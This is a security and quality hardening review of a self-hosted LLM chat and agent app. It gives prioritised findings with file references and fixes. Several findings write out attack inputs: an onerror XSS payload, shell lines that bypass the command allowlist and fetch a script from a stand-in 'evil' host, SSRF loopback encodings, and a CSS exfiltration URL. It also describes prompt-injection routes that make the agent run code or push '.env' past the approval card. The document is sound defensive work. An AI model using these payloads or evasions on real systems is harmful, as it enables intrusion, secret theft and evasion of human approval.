# DuckPond hardening review — what to fix in what already exists

> `BACKLOG.md` tracks **new capabilities**. This file is the opposite: correctness,
> security and quality debt in the 22 stages already shipped. Nothing here is a
> feature request. Everything cites a real file and line.

**Method.** Seven parallel reviews (security/sandbox, reliability/concurrency,
performance/scale, testing/CI, code quality, frontend UX + a11y, ops/deploy), each
reading the actual code, then a fact-check pass over every finding. 71 findings.
Items marked **[unverified]** were produced by the review pass but their independent
fact-check did not run — the claim is grounded in cited code but confirm before acting.
Items with no marker were either fact-checked by a second reviewer or re-confirmed by
hand while writing this file.

---

## P0 — fix soon

- **Model output is rendered as raw HTML.** `web/src/lib/markdown.js:46-54` calls
  `marked.parse()` with no sanitizer, and the result goes through `{@html}` at
  `Message.svelte:209/211/127`, `RunFeed.svelte:59` and `QrWidget.svelte:6`. `dompurify`
  is in the lockfile only as a mermaid transitive dep — never imported. No CSP is set
  anywhere (`index.js` registers only cookie + static). `fetch_page` and `web_search`
  are `RISK.READ` so they auto-run in every mode except `readonly`; any page they fetch
  can carry `<img src=x onerror=fetch('/api/auth/invites',{method:'POST'})>` and it
  executes on the app origin as the viewer. httpOnly protects the cookie but not the
  API — same-origin JS calls everything as that user. **Fix:** promote `dompurify` to a
  direct dep and sanitize inside `renderBlock` (keep the block cache keyed on sanitized
  output); stop trusting model-typed ` ```duckwidget ` fences (server-side nonce, or
  strip them from model text); add `Content-Security-Policy: default-src 'self';
  script-src 'self'; object-src 'none'` in `index.js`.

- **`SAFE_CMD` de-escalation runs unapproved shell in the default mode.**
  `server/src/permissions.js:87,142-145`. The guard is
  `SAFE_CMD.test(cmd) && !/[|;&><$\`]/.test(cmd)` — `SAFE_CMD` is `^`-anchored with no
  `m` flag so it only inspects the first word, and the metacharacter class omits `\n`.
  Two working bypasses: `ls\ncurl -sO http://evil/x.sh` (newline is a `bash -lc`
  separator), and `find . -maxdepth 0 -exec bash -c "…" +` (`find` is in `SAFE_CMD`;
  `+` terminates without `;`). Both flip the verdict to `allow` in `balanced` — no
  approval card — and because the branch returns `risk: RISK.READ`, `gateToolCall`
  (`routes/agent.js:249-256`) also skips `auditTool`, so nothing lands in `tool_audit`
  either. Silent, unlogged, arbitrary execution. **Fix:** reject `\n \r | ; & < > $ ` (
  )` before running `SAFE_CMD`; drop `find` (or reject `-exec/-execdir/-ok/-delete`);
  audit-log de-escalated calls instead of treating them as silent reads.

- **Workspace preview voids its own iframe sandbox.** `routes/agent.js:804-833` serves
  any workspace file with a real `text/html` content type from the app's own origin;
  `ChatFiles.svelte:198-200` loads it with `sandbox="allow-scripts … allow-same-origin"`
  — the documented combination that grants full same-origin privileges. `github_pull`
  is `RISK.WRITE` and auto-allowed in `balanced`, so a poisoned `index.html` in any
  pulled repo becomes script running as the viewer the first time it's previewed. A
  markdown sanitizer does not help here; the payload is its own document. **Fix:** drop
  `allow-same-origin` from the iframe (the preview does not need it) and add
  `Content-Security-Policy: sandbox; default-src 'none'` to the response.

- **One file-stream error kills the whole server.** `routes/agent.js:832` and `:928`
  both `reply.hijack()` then `createReadStream(p).pipe(reply.raw)` with no `.on('error')`
  and no destroy on client close. `pipe()` does not forward errors, and
  `index.js:37` is `process.on('uncaughtException', … process.exit(1))`. A file vanishing
  between the `existsSync` check and the open — or EMFILE, or EACCES — exits the process,
  taking every in-flight generation and every waiting-for-approval agent run with it
  (all that state is module memory). An aborted download also leaks the fd. **Fix:**
  attach `rs.on('error', …)`, and `reply.raw.on('close', () => rs.destroy())`. The other
  three `createReadStream` uses go through `reply.send(stream)` and are fine.

- **`deploy.sh` advances HEAD before it builds, and there is no CI.** Confirmed by
  reading the script: `git merge --ff-only` is line 28, the builds are lines 34/39, the
  restart is line 42, and `set -euo pipefail` is line 4. A failed `npm run build` aborts
  with HEAD already moved — so the next timer tick sees `LOCAL = REMOTE` and exits 0.
  Production stays on the old bundle forever, `deploy complete` never prints, and nothing
  else raises an alarm. The restart is fire-and-forget: nothing polls `/api/version` or
  `/api/health` to confirm the new code booted. Lines 34/39 use `npm install`, not
  `npm ci`, against committed lockfiles — one lockfile rewrite trips the line-12 dirty
  check and disables auto-deploy permanently, silently. And `NODE_BIN` is pinned to
  `/home/cranky/.nvm/versions/node/v22.23.1/bin` while `REPO` is `/home/lewis/duckpond`;
  one node patch upgrade removes that directory and deploys die. Meanwhile there is no
  `.github/` anywhere — the 79 passing assertions in `server/test/` gate nothing, and
  main auto-deploys. NEXT-STEPS §6 already records issue #6, a route-syntax startup
  crash: exactly what a boot smoke test catches for free. **Fix:** `npm ci`; capture
  `PREV` and `trap 'git reset --hard "$PREV"' ERR`; restart *then* poll
  `/api/version` and assert the sha matches; make the dirty-tree skip exit non-zero. Add
  `.github/workflows/ci.yml` on PR + push-to-main: `npm ci && npm test`,
  `node --check` over `server/src/**`, `npm run build`, and a boot smoke test
  (`DUCKPOND_DB=$RUNNER_TEMP/x.db PORT=3999 node src/index.js` → expect 200 on
  `/api/version`, 401 on `/api/stats`). NEXT-STEPS §5 already prescribes all of this
  manually.

- **No backup exists for the one file holding every secret.** `data/duckpond.db` is the
  sole store of password hashes, all session tokens, every provider API key in plaintext
  (`db.js:499`) and every user's GitHub PAT in plaintext (`db.js:470`). Grepping
  README, NEXT-STEPS, notes/, deploy.sh and scripts/ for `backup|restore|VACUUM INTO`
  returns nothing. `data/` is gitignored, so nothing off-box has a copy. WAL is on
  (`db.js:11`), so a naive `cp` is not even a valid backup — it drops the `-wal` file
  and can tear. Disk failure or a bad migration means every user re-registers, every
  provider key is re-issued, every PAT regenerated. **Fix:** `scripts/backup-db.mjs`
  using `VACUUM INTO` (WAL-safe, runs live), a daily `duckpond-backup.timer`, N rotating
  copies, one off-box, dir `chmod 0700`, and a `## Backup and restore` section in the
  README covering the restore side too (stop service, swap .db, delete stale
  `-wal`/`-shm`, restart). **[unverified]**

- **The settings form is wiped every 6 seconds.** `SettingsPanel.svelte:119` derives
  `model` from `app.models`; the `$effect` at `:186-188` unconditionally reassigns
  `form` from it. `App.svelte:197` polls every 6s → `pollStatus()` →
  `loadModels()` → `app.models = await api('/api/models')`, a wholesale reassignment
  producing fresh object identities. So every unsaved edit — the system-prompt textarea,
  every generation slider, ctx_size, the GBNF/JSON-schema boxes, per-model tool
  checkboxes — silently reverts on a 6-second cadence while the savebar still says
  "Save changes". Writing a multi-sentence system prompt is impossible. **Fix:** gate
  the mirror on model *id*, not object identity, and don't clobber a dirty form:
  track `formFor` and return early when the id is unchanged.

---

## P1 — worth doing

### Correctness and security

- **`fetch_page` SSRF guard checks only the first URL.** `websearch.js:39-52` string-matches
  the hostname, then fetches with `redirect: 'follow'` — undici follows up to 20 redirects
  without re-running the guard, so `302 → http://127.0.0.1:8090/…` lands on loopback. The
  check is purely lexical (no DNS resolution, so a hostname with an A record at 127.0.0.1
  passes, as does rebinding) and the literal list misses `::ffff:127.0.0.1`, decimal/octal
  forms like `http://2130706433/`, and CGNAT `100.64.0.0/10`. `fetch_page` is `RISK.READ`
  and auto-runs, so this is a read primitive against SearxNG, the llama router, the speech
  bridge and DuckPond's own API. `makeLinkPreviewWidget` reuses the same guard. **Fix:**
  resolve first and validate every returned address with `ipaddr.js` `range()`, then
  `redirect: 'manual'` and re-check each hop.

- **DB and secrets are world-readable.** `db.js:8` calls `mkdirSync` with no `mode` (0755)
  and `new Database()` creates the file 0644; no `chmod`/`umask` anywhere in the repo.
  `sessions.id` is the entire bearer credential — `sessionUser()` does a bare
  `WHERE s.id = ?` with no IP binding and no rotation — so any local account that can read
  the file gets passwordless takeover of every live session, plus every PAT and provider
  key. Not reachable from the sandbox (only `wsDir` is bind-mounted), so this is host-local.
  **Fix:** `mode: 0o700` on the dir, `chmodSync(DB_PATH, 0o600)` (and the `-wal`/`-shm`
  siblings), same for uploads/workspaces/exports. Longer term store `sessions.id` as a
  SHA-256 hash — the lookup is already an exact match, so it's a two-line change.

- **The `github_commit` approval card hides what's being pushed.** `permissions.js:167`
  renders only `Commit N file(s) to repo@branch — "msg"`. No paths. `agent.js:455-459`
  resolves each `f.workspace_path` *after* `gateToolCall` returned, so the content the
  user approved was never shown and had not even been read at approval time. A prompt-injected
  agent can slip `{path:'notes.txt', workspace_path:'.env'}` into the array and the card
  looks identical. This is the `external` tier — the one `permissions.js:26-28` calls "the
  only tier where a mistake is not undoable". **Fix:** list every path in `describeCall`,
  flag `workspace_path` sources explicitly (`notes.txt ← .env`), resolve content before
  the gate, and put the path list in the `approval_request` payload so `RunFeed` can render
  more than one `<code>` line.

- **Workbench agent runs bill remote providers with no ledger and no spend cap.**
  `routes/agent.js` contains zero occurrences of `recordUsage`/`recordEvent`/`providerMonthSpend`
  (confirmed by grep), and `POST /api/workspaces/:id/runs:849` passes `req.body?.model`
  straight through with no check that it's a local id — `llama.js:146` happily dispatches
  an `r<n>:` id to the paid path. `MAX_STEPS` is 80, so one run is up to 80 unmetered paid
  calls. The cap lives in an inline block in `chatPost.js:399-406`, reachable only from the
  chat turn. `POST /api/conversations/:id/compact` has the same gap. **Fix:** move the cap
  check and ledger write behind the dispatcher (a `billedStreamChat` taking
  `{userId, convId, kind}`) so every caller gets it; stopgap, reject remote ids in the runs
  handler with a 400.

- **Migrations run before their tables exist, and every failure is swallowed.**
  `db.js:415-439` ALTERs `providers`/`provider_models` — but those tables aren't created
  until the `db.exec` block at `:494`. On a fresh DB every one of those statements throws
  "no such table" into `catch { /* exists */ }`. Harmless only because the CREATE bodies
  redundantly list the same columns. There's no `PRAGMA user_version` anywhere, so all ~26
  ALTERs re-run and re-fail on every boot, logging nothing. The same unconditional catch
  swallows syntax errors, disk-full and SQLITE_BUSY identically to "duplicate column name".
  Separately, the images→AUTOINCREMENT migration at `:343-388` does a real `DROP TABLE`,
  every boot, with no pre-migration snapshot (see the backup finding) and a `console.warn`
  on failure before booting normally anyway. **Fix:** move the block below the CREATEs;
  route every ALTER through an `addColumn()` helper that rethrows unless
  `/duplicate column name/i`; `VACUUM INTO` a snapshot before any destructive migration.

- **Login is a username oracle and a 5-request DoS.** `routes/auth.js:59` short-circuits
  `user && await verifyPassword(...)`, so a nonexistent user returns in ~1ms and a real one
  in the ~50-100ms `ARGON_OPTS` costs — trivially measurable. And `recordFailure` is called
  before any existence check, with `FAILS_PER_USER = 5` and a doubling lockout capped at
  24h: five wrong-password POSTs lock any known account, from any IP. Invite-created
  usernames are chosen by the invitee and tend to be predictable. **Fix:** always run an
  argon2 verify against a module-level dummy hash; track failures per (user, ip) and require
  more than one source IP before the per-user counter locks. **[unverified]**

### Reliability

- **No idle deadline on the streaming LLM fetch.** `llama.js:157-236` and
  `providers.js:493-600` pass only `signal` — no connect or idle timeout around the
  `reader.read()` loops. The reasoning watchdog is armed only by `meta.reasoning` and
  `thinkMs` is 60 minutes for research modes, so it is not a general stall guard. Undici's
  default 300s `bodyTimeout` does eventually fire, so this is a 5-minute stall per event,
  not a permanent hang — but with `DUCKPOND_GPU_QUEUE=1` that dead request holds the single
  GPU slot the whole time while everyone else queues, and the failure surfaces as an opaque
  `UND_ERR_BODY_TIMEOUT`. **Fix:** a 60-120s per-chunk idle deadline in both loops, reset on
  every resolved read, plus `AbortSignal.any([abortSignal, connectTimeout])`.

- **A throw in the gate block 409-locks the workspace forever.** `chatflow.js:441-495` calls
  `bindRunAbort` at :443 but the `try` owning `finally { releaseRunAbort(...) }` doesn't start
  until :483. Everything between — three `emitRunEvent` inserts and an `execTool('write_file')`
  that can throw ENOSPC/EACCES — is unprotected. If it throws, `runAborts` keeps the entry,
  `isRunLive()` stays true forever, and every later turn on that workspace 409s. Both
  automatic recovery paths deliberately skip live runs, and `POST /api/runs/:id/stop` does
  *not* fix it (`agent.js:897` aborts but never deletes the entry). Only pressing Stop on the
  conversation, or a restart, clears it. **Fix:** move `bindRunAbort`/`subscribeRun` inside
  the try.

- **Two GPU paths bypass the single-slot queue.** `gpuqueue.js:8-11` states the invariant and
  names three call sites; `routes/chat.js` contains no `acquireGpu`/`withGpu` at all, so
  `POST /api/conversations/:id/compact:226` runs `streamChat` on a local model holding no
  slot. And for remote conversations `chatPost.js:170` skips the queue by design — but
  `auxModelFor` explicitly returns a *loaded local* model, and that drives auto-title,
  follow-ups and memory extraction (`:666/687/706`), all hitting the router unqueued. Exactly
  the model-swap thrash the queue exists to prevent, precisely when it's enabled.

- **Aborting a chat turn makes a live workbench run unkillable.** `chatPost.js:729-739`
  selects *all* running rows for the workspace and calls `finishRun` when
  `!isRunLive(row.id) || aborted`. That `|| aborted` force-finishes demonstrably-live runs
  *without* aborting them — `finishRun` deletes from `runAborts` but never calls
  `ctrl.abort()`. The run's controller is now unreachable and its row no longer matches
  `stopRunsForWorkspace`, so it keeps executing shell up to `MAX_STEPS = 80`. **Fix:** scope
  the cleanup to this turn's `runId` and drop the `|| aborted` shortcut.

- **A failing provider key re-syncs every 6 seconds forever.** `providers.js:385-392` stamps
  `last_sync_at` only on success; the catch rethrows without touching it. `syncStaleProviders`
  therefore always considers a broken provider stale, and `/api/models:102` calls it on every
  request — polled every 6s per tab, with no in-flight set, so requests overlap. Two tabs
  doubles it. The only symptom is `last_error` and a lot of egress. **Fix:** a module-level
  `syncing` Set cleared in a `finally`, and stamp an attempt time on failure so a dead key
  backs off. **[unverified]**

### Performance

- **The context saver's headline engine can never fire.** `saveContext` is called from exactly
  one place — `chatPost.js:417`, on `promptMessages` from `buildPrompt`. The tool pass filters
  `m.role !== 'tool'` (`contextsaver.js:331`), but `insertMessage` only ever writes `user`,
  `assistant` and `compaction` roles (confirmed by grep), so `promptMessages` contains no
  `role:'tool'` message and `report.engines.tool_output` is structurally always 0. The four
  places that *do* build tool messages — `agent.js:663`, `chatflow.js:299/476/571` — never
  call `saveContext`. So the engine the module header calls "RTK's actual win: tool output is
  where the tokens really go" contributes nothing, while `agentLoop` re-sends the newest 8
  tool results verbatim at up to 24,000 chars each, on every one of up to 80 steps. The
  `Context saver: −N tokens` notice is reporting on the two engines that barely run. **Fix:**
  run `compressToolOutput` over `role:'tool'` messages inside `agentLoop` and
  `runInlineSearch` — but not before the next item.

- **Catastrophic backtracking in the progress-bar regex.** `contextsaver.js:100`,
  `/^\s*[█░▒▓■-◿=#.\->\s]{8,}\s*\d*%?\s*$/`, has three greedy quantifiers that all match
  whitespace. I measured it against the regex verbatim: a line of N spaces plus one
  non-matching char takes 45ms at N=100, 128ms at 200, 630ms at 300, 1.9s at 400, **9.4s at
  600**. It runs synchronously per line in `compressToolOutput`. Latent only because that
  function is unreachable — the instant the previous item wires it up, one indented line of
  `run_command` output blocks the event loop for seconds, freezing every other user's SSE
  stream and stalling the 15s keepalive until Cloudflare drops the connections. **Fix:** drop
  `\s` from the class and anchor whitespace explicitly:
  `/^[ \t]*[█░▒▓■-◿=#.\->]{8,}[ \t]*\d*%?[ \t]*$/`, plus a length bound. Add the 600-space
  line to `contextsaver.test.mjs` as a timing regression. **These two land together.**

- **`providerMonthSpend` scans the month twice per remote turn.** `costs.js:37-42` filters on
  `provider_id`, but `usage_events` has only `idx_uevents_user(user_id, created_at DESC)` and
  `idx_uevents_day(created_at)` (confirmed at `db.js:554-555`) — so it walks every row written
  since the 1st, across all users and kinds, to sum one provider. Called at `chatPost.js:401`
  and again at `:629`. The scanned set grows all month because a row is written on every turn
  including local ones. **Fix:** `CREATE INDEX idx_uevents_provider_month ON
  usage_events(provider_id, created_at)`, and compute the post-turn total as `spent + turnCost`
  rather than re-querying. **[unverified]**

- **`/api/models` recompiles two statements per model, on a 6-second poll.**
  `routes/models.js:52-57` selects `pm.*` — pulling `raw_json` (capped at 8,000 chars/row) that
  it never reads — then calls `modelSettings(id)` per row, which issues two fresh
  `db.prepare()` calls each; better-sqlite3 does not cache, so those are real compiles. Default
  `import_mode` is `'all'` and one key can import 300+ models. That's ~600 compiles and ~2.4MB
  of discarded JSON every 6 seconds per open tab, on the event loop streaming everyone's chat.
  **Fix:** name the columns, hoist the two statements to module scope, fold model_settings into
  one query + Map, and split the 6s status poll from the catalog fetch. **[unverified]**

- **Live-job resume snapshot is unbounded.** `liveJobs.js:118-137` appends via
  `s.events = [...s.events, e]` (six sites) and never trims — reset only on `agent_start`.
  Elements are not small: `diff` events carry `before`/`after` at up to 40,000 chars each and
  `tool_output` up to 24,000. `attachListener:218-225` spreads the whole array into one
  `resume` frame for every reconnecting client, and the job is retained 5 minutes after
  completion. One browser refresh mid-run pushes multiple MB down a single SSE frame — and
  serializes it synchronously on the main thread. **Fix:** `push()` instead of spread, cap at
  ~200 events with a dropped count, shrink diffs before they enter state (the full diff is
  already durable in `agent_events`), and have resume carry a `last_event_id` the client
  replays from.

- **Doc upload does 600 serial embeds and 600 separate commits.** `docs.js:79-83` awaits each
  `embed()` one at a time and runs each `ins.run()` outside any transaction, with
  `MAX_CHUNKS = 600`. A book-sized PDF holds the request open for the full serial time with no
  progress and no cancel, while 600 individual WAL commits contend with every chat turn on the
  box. **Fix:** bounded-concurrency embed pool (4-8), then one `db.transaction()` around all
  the inserts. **[unverified]**

- **Embedding backfill dies on the first bad row and retries it forever.** `memory.js:45-48`
  has no per-row try/catch — the only catch is outside the loop, so one `embed()` rejection
  discards the remaining rows. The selecting query is `ORDER BY m.id DESC LIMIT 500`, so the
  10-minute timer re-derives the same doomed prefix indefinitely: everything behind one
  permanently-unembeddable message is never searchable, and the anti-join scan is paid every
  10 minutes for zero progress. **Fix:** move the try/catch inside the loop and write a
  sentinel row so the anti-join stops selecting known-bad messages. **[unverified]**

### Frontend

The a11y items below are P1 as written; treat them as P0 if anyone using this pond relies
on assistive tech.

- **The three most important live regions don't exist.** `aria-live` appears exactly once in
  the whole frontend — `Message.svelte:200`, on the typing dots, which unmount the instant the
  first token lands. The streamed reply itself (`:204`), Chat's `.status` block
  (`Chat.svelte:1078-1095`: queue position, model loading, "waiting for your approval",
  stream errors), and `RunFeed`'s `approval_request` card (`:84-101`) are all plain divs. So a
  screen-reader user hears "Generating reply", then silence — and when the agent blocks on an
  approval, the run halts waiting for a click they have no way to know exists. Toasts are the
  same (`Toast.svelte:8-18`, no `role`/`aria-live`), which matters because toasts are the app's
  *only* error channel: upload failures, generation errors, rename failures, every settings
  mutation. **Fix:** `role="status" aria-live="polite"` on the toast stack with a separate
  `role="alert"` container for errors; live region on a stable wrapper around the assistant
  body; `role="status"` on `.status`, `role="alert"` on `.stream-err`; announce + focus the
  approval card when it appears. **[unverified]**

- **ConfirmDialog: global Enter fires the destructive action.** `ConfirmDialog.svelte:16-24`
  binds `onKey` to `<svelte:window onkeydown>` and maps Enter to `answerConfirm(true)`
  unconditionally — not scoped to the dialog, not to the confirm button. Anyone mid-sentence in
  the composer who taps Enter confirms a `danger: true` delete. Nothing focuses the card,
  nothing traps Tab, nothing restores focus, so the dialog is never announced and Tab walks the
  page behind the scrim. Every destructive path in the app funnels through this component.
  Escape compounds it: `App.svelte:218-229` has no `confirmState.open` guard, so Escape both
  cancels the dialog *and* closes the Settings panel behind it. **Fix:** focus Cancel on mount
  (safe default for `danger`), trap Tab, restore focus on close, scope keys to the card, and
  either drop the Enter shortcut or fire it only when `!danger`. Guard `shortcuts()` with
  `if (confirmState.open) return`. **[unverified]**

- **~25 settings controls are unlabeled.** `SettingsPanel.svelte` — the `role="switch"` toggles
  have a single `<span class="knob">` child and no `aria-label`/`aria-labelledby`; every
  `<select>` and `<input type="range">` has its label in a sibling `.rt`/`.shead` div with no
  id and no `<label for>`. A screen reader announces the Permissions section as "combo box,
  balanced" and Generation as "slider, 0.70" ×4 — including the permission mode and the content
  filter. Only the tool checkboxes are correct. **Fix:** id the `.rt` labels and
  `aria-labelledby` them, or extract a `<SettingRow>` snippet that mints the id. **[unverified]**

- **`SettingsPanel` swallows every fetch error.** Unlike `ProvidersPanel` (which keeps an
  `error` state) it has neither loading nor error state: `loadMemories()` catches to `[]` so a
  failed request renders "Nothing remembered yet"; `loadAdmin()` catches silently so an owner
  sees empty Users/Invites/Bans; and `api('/api/github').catch(() => {})` leaves `gh` null,
  which renders the **Connect GitHub form to a user who is already connected** — inviting them
  to mint and paste a fresh PAT to fix a problem that doesn't exist. **Fix:** tri-state each
  section (loading / error / loaded) with a "Couldn't load — retry" row. **[unverified]**

- **Hover-only controls never appear on keyboard focus.** `app.css:175-178` defines a proper
  `:focus-visible` ring, but `Message.svelte:393` (`.actions`), `Sidebar.svelte:447` (`.act` —
  rename and *delete* on every conversation row) and `ModelPicker.svelte:315/324` reveal at
  `opacity: 0` on `:hover` only. A keyboard user tabs onto fully transparent buttons, one of
  which permanently deletes the chat. **Fix:** add `:focus-within` to each reveal selector —
  three one-line CSS changes. **[unverified]**

- **Collapsed sidebar stays in the tab order on desktop.** `Sidebar.svelte:342-357` collapses
  via `width: 0` + `overflow: hidden` while `.inner` keeps its 268px. The mobile rule at
  `:555-562` correctly adds `visibility: hidden`; the desktop base rule has no equivalent, so
  tabbing walks a dozen-plus invisible stops — including deletes — before reaching the composer.
  **Fix:** `visibility: hidden` on the desktop collapsed rule, or `inert` on the `<aside>`.
  **[unverified]**

- **`ModelPicker` arrow keys don't scroll the highlight into view.** `:89-94` mutates `hoverIdx`
  with no `scrollIntoView`, inside a `max-height: min(440px,70dvh)` scroller. Past the visible
  rows the highlight moves off-screen while the list stays put, and Enter selects a model the
  user can't see. The `role="option"` divs also sit in a plain `<div>` with no `role="listbox"`,
  which makes the ARIA invalid and discarded. **Fix:** bind the option elements and
  `scrollIntoView({block:'nearest'})` on change; add `role="listbox"` + combobox wiring.
  **[unverified]**

- **`--text-faint` fails WCAG AA and is the color of nearly every secondary label.**
  `app.css:173` `#6f695e` is 3.58:1 on `--bg` and 3.16:1 on `--bg-card`, used at 9-12px across
  Chat, Sidebar, ModelPicker and Message — model pricing, capability chips, empty states,
  search-result dates. `ConfirmDialog`'s danger button is `#fff` on `#c0604f` = 4.18:1, also
  under. **Fix:** lift to ~`#8a8377` (5.3:1 / 4.7:1, still clearly below `--text-dim`), bump
  `.cap` off 9px, and darken `--red`. One-line change with app-wide reach. **[unverified]**

### Maintainability

- **`chatBackend.js`'s remote half is dead code that duplicates `llama.js` — and NEXT-STEPS
  tells maintainers to keep it in sync.** `streamChatAny`, `countTokensAny`,
  `mapParamsForRemote` and `DEFAULT_REMOTE_MAX_TOKENS` have **zero importers** anywhere
  (confirmed by grep across server/ and web/). `LLAMA_ONLY` is a character-for-character copy of
  `llama.js`'s `LLAMA_ONLY_PARAMS`, and `streamChatAny` duplicates `remoteCall` with two silent
  divergences: no fallback-chain retry, and a 16384 max_tokens cap where the live path caps at
  4096. Meanwhile `NEXT-STEPS.md:84` instructs future maintainers that `chat_template_kwargs`
  is on "BOTH remote strip lists … Don't 'fix' this by removing the strip" — protecting a list
  no request passes through. Someone will update both and ship a half-working change. **Fix:**
  delete the four dead exports and correct NEXT-STEPS.md:84 to name only `llama.js`.

- **The SSE parse loop is copy-pasted between `llama.js` and `providers.js` and has already
  drifted.** `providers.js:518-600` and `llama.js:175-241` are the same ~65-line body —
  identical reader/decoder loop, byte-identical `tool_calls` accumulator, identical
  `makeThinkSplitter` wiring. But `llama.js:194` does `startsWith('data: ')` + `slice(6)` with
  no trim while `providers.js:553` does `startsWith('data:')` + `slice(5).trim()`. The remote
  one is correct — SSE doesn't require the space. A llama-server build (or a proxy) emitting
  `data:{...}` makes the *local* path drop every chunk and return an empty reply, presenting as
  "the model returned nothing" rather than a parse bug. Neither loop has a test. **Fix:** extract
  one `consumeChatSse(body, {onDelta, onTimings})` and keep the `providers.js` parser.

- **`chatPost.js` is a single 707-line handler with no seams.** `app.post('/api/conversations/:id/chat')`
  spans :54-761 as one async function — one try, one catch, one finally — containing SSE setup,
  regenerate resolution, prompt assembly, spend cap, context saver, prefix-cache reorder, aux
  pick, auto-compaction, response cache, the streamChat attempt + retry, four turn-shape
  branches, usage recording, cap warning, cache store, context recount, auto-title, follow-ups
  and memory extraction. The extraction that produced `chatflow.js` clearly stopped partway. The
  `finally` has to defensively reconstruct state precisely because nothing inside has its own
  lifetime. **Fix:** pull :624-712 into `finalizeTurn()` (pure sequence, no control flow back)
  and :396-520 into `prepareTurn()`. That alone gets the handler under ~300 lines with no
  behaviour change.

- **No linter, no type-check, anywhere.** No `.eslintrc*`, `eslint.config.*`, `tsconfig.json` or
  `jsconfig.json` in the tree; no lint script or lint devDependency in either package.json.
  NEXT-STEPS §5 substitutes `node --check`, which is a parser — it cannot see an unused import,
  a typo'd identifier, a missing export or a bad import path. §5 step 3 concedes this in
  writing: "lint alone missed issue #5". On the frontend it's wider: `vite build` does not
  type-check Svelte templates, so a renamed prop builds clean and fails in the browser.
  **Fix:** flat `eslint.config.js` with `eslint-plugin-n` (`n/no-missing-import`,
  `n/no-extraneous-import` are the two that catch the §5 class of failure), plus `svelte-check`
  as a `web` script. Wire both into CI. **[unverified]**

- **`permissions.js` and `github.js` are the highest-risk untested modules.** `server/test/`
  holds only `contextsaver` and `reasoning`. `permissions.js` is the gate every tool call passes
  through — and its `SAFE_CMD` hole (P0 above) is exactly what a test table would have caught.
  `github.js` holds the only in-code guard against committing to a default branch
  (`:192-194`), and it's unreachable from a test because `gh` and `API` are module-private, so
  its only verification is a human following NEXT-STEPS §2 step 7 with a real PAT. A refactor
  that reorders `commitFiles` silently removes the refusal. **Fix:** `permissions.test.mjs`
  covering four modes × four risk tiers, every `DANGEROUS_CMD` escalation, the newline and
  `find -exec` bypasses, and per-tool overrides — it needs no DB work since `db.js:7` already
  reads `DUCKPOND_DB`. Accept an optional `fetchImpl` in `commitFiles` and add
  `github.test.mjs` for the default-branch refusal, the push-permission check, and a
  `splitRepo` table. **[unverified]**

---

## P2 — polish and cleanups

- **`screenshot` builds a shell string by interpolation.** `agent.js:410-411` interpolates
  `out`/`target` into single-quoted words passed to `bash -lc`; a single quote in either closes
  the quoting, and `out` is additionally inside a `$( )`. It's `RISK.READ`, so no card and no
  audit row. Latent today only because the sandbox image has no chromium — which is a tracked
  next-step, so fix it in the same change. **Fix:** an `execArgv()` sibling to `execCmd` that
  passes argv without `bash -lc`.

- **Any friend can publish a theme whose CSS runs in the owner's page.**
  `routes/themes.js:319-332` is behind bare `requireAuth` — no owner check — and `sanitize()`
  gives `customCss` only a 20,000-char slice before it's written into a `<style>` element. The
  CSS can't create scripts, but `background-image: url(https://evil/…)` on attribute selectors
  leaks UI state, and `position: fixed; z-index: 2147483000` — the pattern the seeded themes
  already use — can cover or visually rewrite the agent approval card. UI redress against the
  one human checkpoint in the permission model, from the lowest-privileged tier. **Fix:**
  allowlist or strip `url(`/`@import`/`position:fixed`/high `z-index` on publish, or keep
  custom CSS local-only.

- **Three `GET`s in `providers.js` skipped `ownerOnly`.** `:62`, `:68` and `:198` sit on bare
  `requireAuth` while their nine siblings are gated. `mask()` returns `base_url`, `key_hint`
  (last 4 of the key), `spend_cap_usd`, `month_spend` and `last_error` — so any friend can
  enumerate the owner's paid providers and billing posture. Looks accidental: the `PATCH` and
  `DELETE` on the same path are both gated. **Fix:** gate them, or split a public projection
  (`model_id`, `label`, `context_length`, `caps`) for the picker.

- **`/api/health` is a hardcoded `{ok:true}`.** `index.js:76` touches nothing — not SQLite, not
  podman, not the router. It returns 200 while every sandbox call fails and every provider sync
  errors. `/api/version` is resolved once at import, so it can't tell you the process is wedged
  either. Any uptime monitor reports green through a total functional outage. **Fix:** make it a
  real readiness check with a per-dependency map and a 503, so both a monitor and deploy.sh's
  post-restart probe can key off it. **[unverified]**

- **Every background job discards its errors.** `index.js:80/82/89/90` all end in
  `.catch(() => {})` — including `reapIdleSandboxes`, the only thing stopping idle 3 GiB
  workspace containers. If podman goes away it throws every 120s forever with nothing logged,
  counted or exposed, until the host OOMs. Inconsistently, `syncStaleProviders` at `:95-96` is
  called bare inside setTimeout/setInterval while its siblings are wrapped — and it's
  synchronous, so a throw becomes an uncaughtException and `process.exit(1)`. **Fix:**
  `.catch(err => app.log.error({err, job}, …))`, a `{lastOk, lastErr, consecutiveFailures}` map
  surfaced on `/api/health`, and wrap :95-96 like its siblings.

- **The two most important log lines bypass the logger.** `index.js:37-38` use raw
  `console.error` for `UNCAUGHT` and `UNHANDLED_REJECTION` — they're declared before `app`
  exists on line 40, so they *can't* use pino. `db.js:383/386` do the same during migration. The
  journal is structured JSON with exactly five plain-text lines in it, and those five are the
  crash, the unhandled rejection and the migration outcomes. Any `journalctl -o json | jq
  'select(.level>=50)'` silently skips every crash. **Fix:** create the pino instance first,
  pass it to Fastify, register the handlers after it, and export it for `db.js`.

- **SSE boilerplate is hand-rolled in four route files** (`chat.js:140-178`, `chatPost.js:85-111`,
  `agent.js:863-880`, `images.js:74-91`) and has already diverged — `chat.js` closes on a
  terminal event, `chatPost.js` doesn't. The 15s keepalive that exists to beat Cloudflare's idle
  timeout is a bare literal in two places. **Fix:** a small `sse.js` exporting
  `openSse(reply, {pingMs})` and `SSE_PING_MS`.

- **`ownerOnly` exists as a helper in one route file and as twelve inline copies in two others**
  (`auth.js` ×10, `speech.js` ×2), with a different 403 body — and the copies use a bare
  `req.user.role` where the helper uses `req.user?.role`. Nothing enforces the guard, so a new
  owner-scoped route is one forgotten line from being open to every friend. **Fix:** promote
  `requireOwner` next to `requireAuth` and register it as a scoped preHandler.

- **Four uncoordinated context thresholds.** `HEADROOM_AT = 0.6` (contextsaver.js:54), a bare
  `budget * 0.75` eight lines below it (`:364`), `AUTO_COMPACT_AT = 0.8` (tokenSaver.js:18), and
  `ContextBar.svelte:9` colouring yellow at 60% / red at 85% — matching none of them. The
  spend-cap threshold is the literal `0.8` written twice on one line (`chatPost.js:632`) despite
  "80% alerts" being a named shipped feature. **Fix:** one `CTX = {lossyAt, trimTo,
  autoCompactAt}` object, exposed to the client so the bar derives its stops.

